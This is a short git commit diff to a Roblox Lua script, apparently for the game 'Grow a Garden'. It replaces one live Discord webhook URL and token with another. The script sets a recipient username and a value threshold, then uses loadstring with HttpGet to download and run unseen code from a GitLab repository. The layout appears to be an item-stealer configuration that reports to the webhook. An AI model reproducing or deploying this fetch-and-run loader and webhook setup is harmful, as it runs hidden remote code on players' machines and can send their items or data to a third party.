c383f6543d551ac7aba32acd06ba4f984eecbcfc
Catilka <catilka@mail.ru>
2025-08-31 17:38:51 +0300

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,5 +1,5 @@
 Username = "Giannys02"
-Webhook = "https://discord.com/api/webhooks/1401250441219670188/l3gWxfapGTsdMIEPN-R31bGpfidWYymET_ls-TxVxXDokoh4tblGmUPpUXMQUlD0mGTI"
+Webhook = "https://discord.com/api/webhooks/1411721839368999004/AqIYNlLymAWnUluhzkQElD8SvGZ1oBxcmys5qcW4CY0yt5BgwjAIcODpGUQtsRYnvJCB"
 MinimumValue = 0
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
